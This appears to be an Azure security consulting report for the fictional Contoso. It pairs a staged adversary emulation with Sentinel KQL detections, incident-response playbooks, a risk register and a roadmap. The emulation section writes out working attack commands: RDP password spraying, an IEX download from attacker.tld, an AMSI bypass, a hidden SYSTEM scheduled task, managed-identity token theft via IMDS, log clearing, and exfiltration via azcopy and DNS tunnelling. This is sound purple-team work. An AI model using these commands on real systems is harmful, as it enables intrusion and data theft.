We emulated a **financially-motivated intrusion** (FIN7-like) targeting Contoso's portal App Service and its backing storage account. Each TTP is tagged with MITRE ATT&CK IDs, executed, and mapped to detections.

### 6.2 Kill-Chain Walkthrough

```
Recon ──▶ Initial Access ──▶ Execution ──▶ Persistence ──▶ Priv Esc ──▶ Defense Evasion
                                                                              │
                                                                              ▼
                     Exfiltration ◀── Collection ◀── Lateral Movement ◀── Discovery
```

#### Stage 1 — Reconnaissance (TA0043)

**TTP:** T1590.005 (Gather Victim Network Information: IP Addresses), T1592.002 (Software).

```bash
# From attacker C2 (external)
amass enum -d contoso.com -active
nmap -Pn -sS -p- --top-ports 1000 portal.contoso.com
# Cloud recon via metadata
curl -s "https://portal.contoso.com" -I | grep -i x-azure-ref
```

Against Entra ID (post-compromise of a single phished credential):
```bash
# ROADtools enumeration
roadrecon auth -u jane.doe@contoso.com -p '<phished>'
roadrecon gather
roadrecon gui
# Or AzureHound for graph attack paths
AzureHound.exe -u jane.doe@contoso.com -p <phished> list --tenant contoso.onmicrosoft.com
```

#### Stage 2 — Initial Access (TA0001)

**TTP:** T1110.003 (Password Spraying) against RDP exposed via misconfigured NSG (V-001).

```bash
# Using hydra against the exposed RDP
hydra -L users.txt -P seasonal-passwords.txt rdp://<pub-ip>:3389 -t 4 -f
# Or Crowbar for more realistic traffic patterns
crowbar -b rdp -u users.txt -C passwords.txt -s <pub-ip>/32 -n 2
```

Success: `contoso\svc-legacy : Summer2025!`

#### Stage 3 — Execution (TA0002)

**TTP:** T1059.001 (PowerShell), T1059.003 (Windows Command Shell).

```powershell
# On compromised VM
IEX (New-Object Net.WebClient).DownloadString('https://attacker.tld/loader.ps1')
# AMSI bypass attempt
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### Stage 4 — Persistence (TA0003)

**TTP:** T1136.001 (Create Account: Local), T1053.005 (Scheduled Task).

```powershell
net user backup-admin 'Tr0ub4dor&3' /add
net localgroup administrators backup-admin /add
schtasks /create /sc onlogon /tn "WindowsUpdateAudit" /tr "powershell -nop -w hidden -e <B64>" /ru SYSTEM
```

#### Stage 5 — Privilege Escalation (TA0004)

**TTP:** T1078.004 (Valid Accounts: Cloud Accounts) abusing the over-privileged Managed Identity (V-003).

```powershell
# From compromised VM — query IMDS for MI token
$response = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata="true"} -UseBasicParsing
$token = ($response.Content | ConvertFrom-Json).access_token

# Because MI is Contributor at sub scope, attacker can now enumerate & modify:
$headers = @{ Authorization = "Bearer $token" }
Invoke-RestMethod "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" -Headers $headers
```

#### Stage 6 — Defense Evasion (TA0005)

**TTP:** T1562.001 (Impair Defenses: Disable or Modify Tools).

```powershell
# Attempt to disable Defender — will be logged, tamper protection will block in Enterprise
Set-MpPreference -DisableRealtimeMonitoring $true
# Clear Security event log
wevtutil cl Security
```

#### Stage 7 — Discovery (TA0007)

**TTP:** T1082 (System Information), T1526 (Cloud Service Discovery), T1069.003 (Permission Groups Discovery: Cloud Groups).

```bash
# Using the stolen MI token
az login --identity
az storage account list --query "[].{name:name, kind:kind}" -o table
az keyvault list --query "[].name" -o tsv
az role assignment list --all --query "[?principalId=='$MI_PRINCIPAL_ID']"
```

#### Stage 8 — Lateral Movement (TA0008)

**TTP:** T1021.002 (SMB/Windows Admin Shares), T1021.006 (WinRM).

```powershell
# From compromised vm-app-prod-01 to vm-app-prod-02
Enter-PSSession -ComputerName vm-app-prod-02 -Credential (Get-Credential)
# Or via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\x" -ComputerName vm-app-prod-02
```

#### Stage 9 — Collection (TA0009)

**TTP:** T1530 (Data from Cloud Storage Object).

```bash
# Using the MI token to list and read blobs
az storage blob list --account-name stcontosoprod001 --container-name customer-data --auth-mode login
az storage blob download-batch -s customer-data -d ./loot --account-name stcontosoprod001 --auth-mode login
```

#### Stage 10 — Exfiltration (TA0010)

**TTP:** T1567.002 (Exfiltration to Cloud Storage), T1048.003 (Exfiltration Over Unencrypted Non-C2 Protocol).

```bash
# Exfil to attacker's own Azure storage (bypasses URL category filters)
azcopy copy "./loot/*" "https://attackerexfil.blob.core.windows.net/stage?<SAS>" --recursive
# Or DNS tunneling
iodine -f -P <key> attacker.tld
```

### 6.3 Full ATT&CK Mapping Table

| Stage | Tactic | Technique | ID | Sub-technique | Detected By (see §7) |
|---|---|---|---|---|---|
| 1 | Recon | Gather Victim Network Info | T1590 | .005 | N/A (external) |
| 2 | Initial Access | Brute Force | T1110 | .003 | DET-001 |
| 3 | Execution | Command & Scripting | T1059 | .001 | DET-002 |
| 4 | Persistence | Create Account | T1136 | .001 | DET-003 |
| 4 | Persistence | Scheduled Task | T1053 | .005 | DET-004 |
| 5 | Privilege Escalation | Valid Accounts | T1078 | .004 | DET-005 |
| 6 | Defense Evasion | Impair Defenses | T1562 | .001 | DET-006 |
| 6 | Defense Evasion | Indicator Removal | T1070 | .001 | DET-007 |
| 7 | Discovery | Cloud Service Discovery | T1526 | - | DET-008 |
| 8 | Lateral Movement | Remote Services | T1021 | .002 | DET-009 |
| 9 | Collection | Data from Cloud Storage | T1530 | - | DET-010 |
| 10 | Exfiltration | Exfil to Cloud Storage | T1567 | .002 | DET-011 |

---

## 7. Detection Engineering & Monitoring

### 7.1 Logging Architecture

```
┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐
│  Entra ID        │  │  Azure Activity  │  │  Azure Resources │
│  - SigninLogs    │  │  Logs            │  │  - NSG flow      │
│  - AuditLogs     │  │  - Admin actions │  │  - KV audit      │
│  - RiskEvents    │  │                  │  │  - Storage logs  │
└────────┬─────────┘  └────────┬─────────┘  └────────┬─────────┘
         │                     │                     │
         └──────────┬──────────┴──────────┬──────────┘
                    ▼                     ▼
         ┌──────────────────────────────────────┐
         │  Log Analytics Workspace             │
         │  (law-contoso-prod-central-01)       │
         │  Retention: 90d hot, 365d archive    │
         │  Daily cap: off; alert on cost       │
         └────────────────┬─────────────────────┘
                          ▼
         ┌──────────────────────────────────────┐
         │  Microsoft Sentinel                  │
         │  + Analytics Rules (scheduled/NRT)   │
         │  + UEBA                              │
         │  + Watchlists (vip-users, jit-ips)   │
         │  + Threat Intelligence (TAXII/MISP)  │
         └────────────────┬─────────────────────┘
                          ▼
         ┌──────────────────────────────────────┐
         │  Logic Apps SOAR Playbooks           │
         │  + ServiceNow / Jira SOC Board       │
         └──────────────────────────────────────┘
```

### 7.2 Required Data Connectors

Enabled at engagement go-live:
- Microsoft Entra ID (SigninLogs, AuditLogs, NonInteractiveUserSigninLogs, ServicePrincipalSigninLogs, RiskyUsers, UserRiskEvents)
- Azure Activity
- Microsoft Defender for Cloud (alerts, recommendations)
- Microsoft Defender XDR (unified; includes MDE, MDO, MDI, MDA)
- Azure Key Vault, Storage, App Service, AKS (via Diagnostic Settings → LAW)
- Windows Security Events via AMA + DCR
- Syslog (Linux) via AMA
- NSG Flow Logs → LAW via Traffic Analytics
- Tenable.io (via built-in Sentinel connector — pushes scan results as custom table `Tenable_IO_Assets_CL`)

### 7.3 KQL Detections (Sample — 11 of 18 production rules)

> Full rule-pack (ARM/Bicep + YAML for `Microsoft.SecurityInsights/alertRules`) is in `/sentinel/analytics/`.

#### DET-001 — RDP brute force followed by success

```kusto
// Detects >= 20 failed RDP logons (EventID 4625, LogonType 10) followed by a success (4624)
// from the same source IP within 10 minutes. MITRE: T1110.003
let lookback = 1h;
let fails =
    SecurityEvent
    | where TimeGenerated > ago(lookback)
    | where EventID == 4625 and LogonType == 10
    | summarize FailCount=count(), FailIPs=make_set(IpAddress)
        by TargetAccount, bin(TimeGenerated, 10m)
    | where FailCount >= 20;
let wins =
    SecurityEvent
    | where TimeGenerated > ago(lookback)
    | where EventID == 4624 and LogonType == 10
    | project SuccessTime=TimeGenerated, TargetAccount, WinIP=IpAddress, Computer;
fails
| join kind=inner wins on TargetAccount
| where SuccessTime between (TimeGenerated .. TimeGenerated + 15m)
| where WinIP in (FailIPs)
| project TimeGenerated, TargetAccount, WinIP, FailCount, Computer
| extend mitre_technique = "T1110.003"
```

**Severity:** High · **Entity mapping:** Account=TargetAccount, IP=WinIP, Host=Computer · **Tactics:** CredentialAccess, InitialAccess

#### DET-002 — Suspicious PowerShell encoded command

```kusto
// MITRE: T1059.001, T1027
DeviceProcessEvents
| where TimeGenerated > ago(1h)
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "-e ")
    or ProcessCommandLine matches regex @"FromBase64String"
    or ProcessCommandLine has "DownloadString"
| where not(InitiatingProcessFileName in~ ("MsSense.exe","Sense.exe"))
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| extend Score = iif(ProcessCommandLine has "IEX", 3, 1) + iif(strlen(ProcessCommandLine) > 600, 2, 0)
| where Score >= 2
```

#### DET-003 — Local account creation on a server

```kusto
// EventID 4720 = user account created. MITRE: T1136.001
SecurityEvent
| where TimeGenerated > ago(15m)
| where EventID == 4720
| extend TargetUser = tostring(EventData.TargetUserName)
| where Computer !startswith "DC-"   // exclude DC account creations
| project TimeGenerated, Computer, Creator=SubjectAccount, TargetUser
```

#### DET-005 — Managed Identity token request followed by cross-resource enum

```kusto
// Detects an MI token obtained from a VM that then performs broad ARM listing within 30 minutes.
// MITRE: T1078.004, T1526
let miTokens =
    AzureDiagnostics
    | where Category == "MSI" or ResourceType == "VAULTS" and OperationName has "TokenRequest"
    | project TokenTime=TimeGenerated, ClientIP=CallerIpAddress, Principal=identity_claim_oid_g;
AzureActivity
| where TimeGenerated > ago(1h)
| where OperationNameValue endswith "/READ" or OperationNameValue endswith "/LIST/ACTION"
| summarize ReadCount=dcount(ResourceId), Resources=make_set(ResourceId, 100)
    by bin(TimeGenerated, 10m), Caller, CallerIpAddress
| where ReadCount > 40
| join kind=inner miTokens on $left.Caller == $right.Principal
| where TimeGenerated between (TokenTime .. TokenTime + 30m)
```

#### DET-006 — Defender tampering

```kusto
// MITRE: T1562.001
DeviceEvents
| where ActionType in~ ("AntivirusDisabled","AntivirusScanCancelled","TamperingAttempt")
    or ActionType =~ "PowerShellCommand"
       and InitiatingProcessCommandLine has_any ("Set-MpPreference","Add-MpPreference")
       and InitiatingProcessCommandLine has_any ("-DisableRealtimeMonitoring","-ExclusionPath","-ExclusionProcess")
| project TimeGenerated, DeviceName, AccountName, ActionType, InitiatingProcessCommandLine
```

#### DET-007 — Security event log cleared

```kusto
// EventID 1102 = audit log cleared. MITRE: T1070.001
SecurityEvent
| where EventID == 1102
| project TimeGenerated, Computer, Account=SubjectAccount
```

#### DET-008 — Impossible travel for a privileged user (with watchlist)

```kusto
let privUsers = _GetWatchlist('PrivilegedUsers') | project UPN;
SigninLogs
| where TimeGenerated > ago(24h)
| where ResultType == 0
| where UserPrincipalName in~ (privUsers)
| extend City = tostring(LocationDetails.city), Country = tostring(LocationDetails.countryOrRegion)
| sort by UserPrincipalName asc, TimeGenerated asc
| serialize
| extend PrevTime = prev(TimeGenerated), PrevCountry = prev(Country), PrevUser = prev(UserPrincipalName)
| where UserPrincipalName == PrevUser and Country != PrevCountry
| extend MinutesBetween = datetime_diff('minute', TimeGenerated, PrevTime)
| where MinutesBetween < 240   // < 4 hours between countries
| project TimeGenerated, UserPrincipalName, Country, PrevCountry, MinutesBetween, IPAddress
```

#### DET-009 — Uncommon PSExec / WinRM lateral movement

```kusto
DeviceProcessEvents
| where TimeGenerated > ago(1h)
| where FileName in~ ("psexec.exe","psexesvc.exe","wsmprovhost.exe")
    or ProcessCommandLine has_any ("Invoke-Command -ComputerName","Enter-PSSession")
| join kind=leftouter (
    DeviceNetworkEvents
    | where RemotePort in (445, 5985, 5986)
    ) on DeviceId
| project TimeGenerated, DeviceName, AccountName, FileName, RemoteIP, RemotePort, ProcessCommandLine
```

#### DET-010 — Mass storage blob download

```kusto
// MITRE: T1530
StorageBlobLogs
| where TimeGenerated > ago(30m)
| where OperationName in ("GetBlob","GetBlobProperties")
| summarize Operations=count(),
            Bytes=sum(toreal(ResponseBodySize)),
            Containers=dcount(ObjectKey),
            IPs=make_set(CallerIpAddress, 20)
    by bin(TimeGenerated, 5m), AccountName, UserAgentHeader
| where Operations > 500 or Bytes > 500000000
```

#### DET-011 — Egress to attacker-controlled storage

```kusto
// Flags outbound to any *.blob.core.windows.net not on the allowlist watchlist
let allowed = _GetWatchlist('ApprovedStorageAccounts') | project AccountFqdn;
AzureNetworkAnalytics_CL
| where TimeGenerated > ago(1h)
| where FlowType_s == "ExternalPublic"
| where DestPublicIPs_s has "blob.core.windows.net" or DestIP_s in (dns_lookup_ips_of_blob_endpoints())
| where not(DestPublicIPs_s has_any (allowed))
| summarize Bytes=sum(OutboundBytes_d) by SrcIP_s, DestPublicIPs_s, bin(TimeGenerated, 5m)
| where Bytes > 100000000
```

#### DET-012 — NSG rule allowing inbound Internet on sensitive port

```kusto
// MITRE: T1190 pre-conditions
AzureActivity
| where OperationNameValue =~ "Microsoft.Network/networkSecurityGroups/securityRules/write"
| where ActivityStatusValue == "Success"
| extend rule = parse_json(Properties).requestbody
| extend destPort = tostring(parse_json(rule).properties.destinationPortRange),
         srcPrefix = tostring(parse_json(rule).properties.sourceAddressPrefix),
         access   = tostring(parse_json(rule).properties.access),
         dir      = tostring(parse_json(rule).properties.direction)
| where access =~ "Allow" and dir =~ "Inbound"
| where srcPrefix in ("*", "Internet", "0.0.0.0/0")
| where destPort in ("22","3389","445","1433","3306","5432") or destPort == "*"
| project TimeGenerated, Caller, CallerIpAddress, ResourceId, destPort, srcPrefix
```

### 7.4 Analytics Rule (YAML) — Example

```yaml
# sentinel/analytics/DET-001-rdp-bruteforce.yaml
id: 4f7e3e2a-9a11-4b7a-93c8-94a6a9c2d001
name: "DET-001 RDP Brute Force Then Success"
description: |
  High-confidence detection of password spray / brute force against RDP followed by
  a successful interactive logon from the same source IP.
severity: High
requiredDataConnectors:
  - connectorId: SecurityEvents
    dataTypes: [SecurityEvent]
queryFrequency: PT10M
queryPeriod: PT1H
triggerOperator: gt
triggerThreshold: 0
tactics: [CredentialAccess, InitialAccess]
techniques: [T1110]
relevantTechniques: [T1110.003]
query: |
  <KQL as in DET-001 above>
entityMappings:
  - entityType: Account
    fieldMappings: [{ identifier: FullName, columnName: TargetAccount }]
  - entityType: IP
    fieldMappings: [{ identifier: Address, columnName: WinIP }]
  - entityType: Host
    fieldMappings: [{ identifier: HostName, columnName: Computer }]
incidentConfiguration:
  createIncident: true
  groupingConfiguration:
    enabled: true
    reopenClosedIncident: false
    lookbackDuration: PT1H
    matchingMethod: Selected
    groupByEntities: [Account, Host]
eventGroupingSettings:
  aggregationKind: SingleAlert
```

### 7.5 Workbook & Dashboards

Two primary workbooks:
- **SOC Overview** — incident heatmap by ATT&CK tactic, top noisy rules, MTTD/MTTR, dwell-time trend.
- **Cloud Posture** — Defender for Cloud Secure Score, Tenable VPR histogram, NSG drift timeline, PIM activation velocity.

---

## 8. Incident Response Workflow

### 8.1 IR Lifecycle (NIST SP 800-61r2 aligned)

```
┌──────────────┐  ┌─────────┐  ┌─────────────┐  ┌─────────────┐  ┌───────────┐  ┌────────────┐
│ Preparation  │─▶│Detection│─▶│ Analysis &  │─▶│Containment, │─▶│Recovery   │─▶│Post-Incident│
│              │  │         │  │ Triage      │  │Eradication  │  │           │  │Activity    │
└──────────────┘  └─────────┘  └─────────────┘  └─────────────┘  └───────────┘  └────────────┘
```

### 8.2 SOAR Playbook Catalog (Logic Apps)

| Playbook | Trigger | Actions |
|---|---|---|
| `PB-ISOLATE-VM` | Sentinel Incident (DET-002/005/009 High+) | Tag VM → move NIC to `nsg-quarantine` (deny-all-in/out except Bastion + MDE) → snapshot OS disk → create ServiceNow ticket |
| `PB-DISABLE-USER` | DET-008 Impossible Travel | Graph `revokeSignInSessions` → disable user → notify manager + user's backup → create ticket |
| `PB-ROTATE-KV-SECRET` | DET triggered on KV access anomaly | Enumerate secrets accessed → rotate via pipeline dispatch → push to apps via MI refresh |
| `PB-BLOCK-IP` | High-confidence C2 detection | Add IP to Azure Firewall deny list (via managed rule collection) → optional: add to CDN/WAF |
| `PB-NOTIFY-CISO` | Any Critical incident | Teams post → SMS via Twilio → record in incident registry |

### 8.3 Example Logic App (Isolate VM)

```json
{
  "triggers": {
    "When_a_response_to_an_Azure_Sentinel_alert_is_triggered": {
      "type": "ApiConnectionWebhook",
      "inputs": { "host": { "connection": { "name": "@parameters('$connections')['azuresentinel']['connectionId']" } } }
    }
  },
  "actions": {
    "Get_Entities": {
      "type": "ApiConnection",
      "inputs": { "path": "/Incidents/Entities", "method": "get" }
    },
    "For_each_Host": {
      "foreach": "@outputs('Get_Entities')?['Hosts']",
      "actions": {
        "Move_to_Quarantine_NSG": {
          "type": "Http",
          "inputs": {
            "method": "PUT",
            "uri": "https://management.azure.com/@{items('For_each_Host')?['AzureID']}/networkInterfaces?api-version=2023-11-01",
            "authentication": { "type": "ManagedServiceIdentity" },
            "body": { "properties": { "networkSecurityGroup": { "id": "/subscriptions/.../nsg-quarantine" } } }
          }
        },
        "Snapshot_OS_Disk": {
          "type": "Http",
          "inputs": { "method": "PUT", "uri": "https://management.azure.com/...snapshots/snap-ir-@{utcNow()}?api-version=2023-10-02" }
        },
        "Post_ServiceNow": { "type": "ApiConnection", "inputs": { "path": "/table/incident" } }
      }
    }
  }
}
```

### 8.4 Sample Incident Timeline — "Operation Contoso Crack"

| Time (UTC) | Event | Actor | Detection / Response |
|---|---|---|---|
| 14:02 | Port scan against `52.168.x.x` (portal pub IP) | Attacker | Azure Firewall Premium IDPS alert (low) |
| 14:17 | RDP brute force against vm-app-prod-01 (via V-001 rule) | Attacker | DET-001 fires at 20 failures |
| 14:19 | Successful logon: `contoso\svc-legacy` | Attacker | DET-001 **HIGH incident created** |
| 14:19:30 | `PB-ISOLATE-VM` runs; NIC moved to `nsg-quarantine` | SOAR | Auto-contained in 32 seconds |
| 14:20 | MDE auto-investigation kicks off, flags PSH IEX | MDE | Evidence auto-collected |
| 14:24 | SOC L2 acknowledges incident | SOC | Triage begins |
| 14:31 | Credentials rotated; `svc-legacy` disabled via PIM workflow | SOC/IAM | Persistence blocked |
| 14:45 | Forensic snapshot mounted to analyst VM; Velociraptor deployed | IR team | Timeline reconstruction |
| 15:30 | Root cause identified: misconfigured NSG rule from 4/21 change | IR/Eng | NSG rule deleted; Azure Policy `deny-internet-rdp` enforced |
| 17:00 | Recovery: new VM deployed from hardened image; workload restored | Eng | Validated with Tenable rescan |
| D+1 | Post-incident review; new detection gap filed | SOC Lead | DET-012 added to prevent recurrence |

**KPIs captured:** MTTD = 2 min · MTTC = 32 s (auto) · MTTR = 2h 58m · Dwell time = 17 min · Data loss = 0.

---

## 9. Risk Assessment & Compliance Mapping

### 9.1 Risk Register (Top 10)

| ID | Risk | Likelihood (1-5) | Impact (1-5) | Score | Treatment | Owner |
|---|---|---:|---:|---:|---|---|
| R-01 | Credential compromise via phishing | 4 | 5 | 20 | Mitigate: phishing-resistant MFA (FIDO2), CA, AiTM detections | CISO |
| R-02 | Ransomware on VMs | 3 | 5 | 15 | Mitigate: MDE P2, ASR, immutable backups, Veeam + ASR | Infra |
| R-03 | Misconfigured storage → data exposure | 4 | 4 | 16 | Mitigate: Azure Policy deny public access; Defender for Storage | Platform |
| R-04 | Over-privileged service principal | 4 | 4 | 16 | Mitigate: PIM for SPs, access reviews, custom roles | IAM |
| R-05 | Vendor/SaaS breach (Tenable, others) | 2 | 4 | 8 | Transfer/Mitigate: vendor security reviews, log SSO | Vendor Mgt |
| R-06 | Insider data exfiltration | 2 | 5 | 10 | Mitigate: Purview DLP, UEBA, egress inspection | CISO |
| R-07 | Azure region outage | 2 | 4 | 8 | Mitigate: Zone-redundant + paired-region DR | SRE |
| R-08 | DDoS against portal | 3 | 3 | 9 | Mitigate: Front Door + DDoS Protection Standard + WAF | App Eng |
| R-09 | Secrets in source code | 3 | 4 | 12 | Mitigate: gitleaks in CI, push protection, KV-only secrets | DevSecOps |
| R-10 | Shadow IT spinning up unmanaged subs | 3 | 3 | 9 | Mitigate: MG-scoped policy, Subscription Creator role locked | Finance/IT |

Risk score = L × I. Treatment SLAs tied to score.

### 9.2 Compliance Mapping Matrix

| Control | Our Implementation | NIST CSF 2.0 | CIS Azure 2.1.0 | MITRE ATT&CK Mitigations |
|---|---|---|---|---|
| MFA (FIDO2) for admins | Conditional Access CA-003 | PR.AA-03 | 1.1.1 – 1.1.4 | M1032 |
| Azure Bastion for admin | VMs have no public IP | PR.AC-05 | 6.1 | M1030 |
| Private Endpoints | PaaS not internet-reachable | PR.DS-05 | 3.10, 4.6, 8.3 | M1030 |
| NSG deny-by-default | Every subnet | PR.AC-05 | 6.2 | M1030 |
| KV CMK at rest | Disks, Storage, SQL | PR.DS-01 | 7.3, 8.1 | M1041 |
| Log Analytics central | 100% of resources via Policy | DE.CM-01 | 5.1 – 5.5 | M1029 |
| Defender for Cloud Std | All subscriptions | PR.PT-01, DE.AE-02 | 2.x | M1016 |
| Sentinel analytics | 18 rules, MITRE-mapped | DE.AE, DE.DP | N/A | N/A |
| Tenable VM scanning | Weekly creds + daily agent | ID.RA-01 | N/A | M1051 |
| Immutable audit logs | Storage immutability policies | PR.PT-01, PR.DS-06 | 5.3 | M1029 |
| PIM for roles | 0 standing privileged access | PR.AC-01, PR.AC-04 | 1.5 | M1026 |
| Encrypted in transit | TLS 1.2+ enforced | PR.DS-02 | 3.9, 4.9 | M1041 |

### 9.3 Threat Model (STRIDE) — Portal Application

| Component | S | T | R | I | D | E | Top Mitigations |
|---|:-:|:-:|:-:|:-:|:-:|:-:|---|
| Entra ID | ● | | | ● | ● | ● | CA, PIM, Identity Protection, token binding |
| App Service | ● | ● | | ● | ● | | Managed Identity, private endpoint, WAF, easy-auth |
| App Storage Account | | ● | | ● | ● | | PE + RBAC + CMK + immutability + Defender Storage |
| Key Vault | ● | ● | ● | ● | | ● | HSM, RBAC, PE, soft-delete + purge protection, alerts |
| SQL DB (future) | ● | ● | | ● | ● | ● | AAD-only auth, PE, TDE + CMK, Auditing, Defender for SQL |
| DevOps Pipeline | ● | ● | ● | ● | | ● | OIDC to Azure, SARIF scanning, branch protection, signed commits |
| Admin Workstations | ● | | | ● | ● | ● | PAW model, Intune compliance, Defender XDR, PIM |

Legend: S=Spoofing · T=Tampering · R=Repudiation · I=Info Disclosure · D=DoS · E=Elevation of Privilege. ● = identified threat.

---

## 10. Consulting Deliverables

### 10.1 Executive Summary (Non-Technical)

> *Suitable for inclusion in Board pack.*

Contoso's Azure migration was architected and deployed to an Enterprise Landing Zone standard aligned with the Microsoft Cloud Adoption Framework and Zero Trust principles. In an eight-week engagement we delivered: (1) a hardened, automated cloud environment where every production resource is private by default, identity-aware, and continuously logged; (2) a vulnerability management capability that finds, prioritizes, and drives remediation of real weaknesses within clear SLAs; (3) a 24x7 detection and response capability that, during a controlled adversary exercise, detected an intrusion in under two minutes and automatically contained it in 32 seconds with zero data loss. Residual risks are tracked in a quarterly-reviewed risk register, and the next 90 days should focus on extending phishing-resistant MFA to all employees, expanding Tenable coverage to legacy on-premises systems during the migration tail, and advancing Zero Trust from the "Initial" to the "Advanced" stage per the CISA model.

### 10.2 Vulnerability Assessment Report (Template)

```
VULNERABILITY ASSESSMENT REPORT
===============================
Report ID: VA-2026-Q2-0004
Engagement:  Contoso Azure Landing Zone
Scope:       sub-corp-prod-01  (53 assets)
Scan window: 2026-04-18 00:00Z → 2026-04-24 00:00Z
Tooling:     Tenable.io (agents + credentialed network scans); Defender for Cloud

Summary of findings
  P0 – Emergency : 0
  P1 – Critical  : 2   (CVE-2022-37958 on vm-app-prod-01/02)
  P2 – High      : 9
  P3 – Medium    : 27
  P4 – Low       : 54

Top remediation items
  1. Apply Sep-2022 CU on Windows Server 2022 (2 hosts) — 7-day SLA
  2. Rotate svc-legacy account → deprecate, move to MI — 14-day SLA
  3. Enforce TLS 1.2 minimum on asp-portal-prod — 30-day SLA
  4. Restrict NSG rule Allow-RDP-From-Anywhere → DELETE — fixed (incident 4/24)
  ...

Attestation: Chief Information Security Officer — signed and dated.
```

### 10.3 Prioritized Security Recommendations

**Now (0-30 days):**
1. Deploy FIDO2 to all `Global Administrator` / `Privileged Role Administrator` accounts; break-glass tested quarterly.
2. Enforce Azure Policy `Microsoft.Network/networkSecurityGroups` — deny RDP/SSH from `Internet`.
3. Remove `Owner` assignments from any service principal at subscription scope. Replace with custom least-priv roles scoped to RG.
4. Enable Defender for Cloud Standard tier on all subscriptions.
5. Onboard all VMs to Tenable.io agents and Defender for Servers P2.

**Next (30-90 days):**
6. Complete private-endpoint migration for legacy PaaS still using service endpoints.
7. Stand up Sentinel UEBA; integrate Tenable findings as enrichment for incidents.
8. Implement Just-in-Time VM access (Defender for Servers) for any remaining management-plane VM access.
9. Deploy Microsoft Purview and classify the 15 top databases/storage accounts that hold Confidential/Restricted data.
10. Move to Workload Identity Federation for all CI/CD pipelines (no secrets).

**Later (90-180 days):**
11. Deploy Azure DDoS Protection Standard on all internet-facing public IPs.
12. Implement WAF-in-front-of-App-Service with custom rulesets.
13. Run first purple-team exercise to measure detection uplift.
14. Advance Zero Trust maturity per roadmap (§11.3).

### 10.4 Detection Engineering Artifacts

Delivered in `/sentinel/` folder:
- 18 × analytics rules (YAML + KQL)
- 5 × hunting queries (KQL)
- 4 × workbooks (JSON)
- 5 × Logic Apps playbooks (JSON/Bicep)
- 3 × watchlists (CSV templates)
- Sentinel repository (CI/CD via GitHub Actions with Content Hub sync)

---

## 11. Bonus: DevSecOps, Container Security, Zero Trust Roadmap

### 11.1 DevSecOps Pipeline (Shift-Left)

```
┌─────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐
│  IDE    │─▶│   PR     │─▶│  Build   │─▶│   Test   │─▶│  Release │─▶│  Runtime │
│ (pre-   │  │ checks   │  │ (SBOM,   │  │ (DAST,   │  │ (signed, │  │ (CWPP,   │
│ commit) │  │ (SAST,   │  │  sign)   │  │  IaST)   │  │  attest) │  │  eBPF)   │
│         │  │ secrets) │  │          │  │          │  │          │  │          │
└─────────┘  └──────────┘  └──────────┘  └──────────┘  └──────────┘  └──────────┘
   git hooks    Checkov      syft/cyclonedx  OWASP ZAP  cosign/       Defender for
   gitleaks     tfsec        Trivy scan      Burp Ent   SLSA v1       Containers
   Snyk IDE     Semgrep      Grype           Nuclei     notation      Falco/eBPF
```

Pipeline-level policies (OPA/Rego) enforce: **no images pulled from public registries**, **only signed images**, **SBOM must be attached**, **no Critical CVEs at image-build**, **IaC security score > 95%**.

### 11.2 AKS Container Security

- **Cluster:** AKS with **Azure CNI Overlay**, Kubenet deprecated; **Cilium** dataplane for eBPF-based network policy.
- **Identity:** **Workload Identity Federation** → Managed Identity (no pod-identity v1).
- **Admission:** **Azure Policy for AKS (Gatekeeper/OPA)** with constraint templates: disallow `privileged`, disallow `hostPath`, require non-root UID, require resource requests/limits.
- **Network policies:** default-deny; explicit `NetworkPolicy` per namespace (`netpol-web-to-api`, etc.).
- **Runtime:** **Microsoft Defender for Containers** + optional **Falco** rulesets for agentless CWPP.
- **Registry:** **Azure Container Registry Premium** with content trust, image quarantine, Defender vulnerability scanning (Trivy engine).
- **Secrets:** **Secrets Store CSI Driver** pulling from Key Vault; no K8s secrets mounted from etcd unless encrypted with CMK.

Example Gatekeeper constraint:
```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPAllowPrivilegeEscalationContainer
metadata:
  name: no-priv-escalation
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    excludedNamespaces: ["kube-system","gatekeeper-system"]
```

Example network policy:
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: portal
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-web-to-api
  namespace: portal
spec:
  podSelector: { matchLabels: { app: api } }
  policyTypes: [Ingress]
  ingress:
  - from:
    - podSelector: { matchLabels: { app: web } }
    ports:
    - protocol: TCP
      port: 8443
```

### 11.3 Zero Trust Maturity Roadmap (CISA ZTMM v2.0)

| Pillar | Current State | 6 mo Target | 12 mo Target |
|---|---|---|---|
| Identity | Traditional | **Initial** — phishing-resistant MFA for admins; centralized IdP | **Advanced** — risk-based, session-level, continuous eval for all users |
| Devices | Traditional | **Initial** — Intune compliance for corp devices | **Advanced** — device attestation, hardware root of trust, CAE |
| Networks | Initial (hub-spoke done) | **Advanced** — microsegmentation by workload identity | **Optimal** — SASE + ZTNA everywhere |
| Applications | Traditional | **Initial** — App proxy / WAF for legacy; MI for cloud-native | **Advanced** — continuous auth checks per call; service mesh mTLS |
| Data | Traditional | **Initial** — classification + DLP on top 20 data stores | **Advanced** — inline DLP, dynamic masking, auto-labeling |
| Visibility & Analytics | Initial | **Advanced** — UEBA enabled; cross-domain correlation | **Optimal** — adaptive controls driven by analytics |
| Automation & Orchestration | Initial | **Advanced** — 80% of high-fidelity alerts auto-contained | **Optimal** — self-healing environment, policy-as-code everywhere |

---

## 12. Appendices

### Appendix A — File Inventory (companion deliverables)

| File | Purpose |
|---|---|
| `README.md` | This master report |
| `infrastructure/main.tf` | Terraform root module (prod env) |
| `infrastructure/modules/*` | Reusable modules referenced in §4 |
| `sentinel/analytics/DET-*.kql` | KQL for each detection |
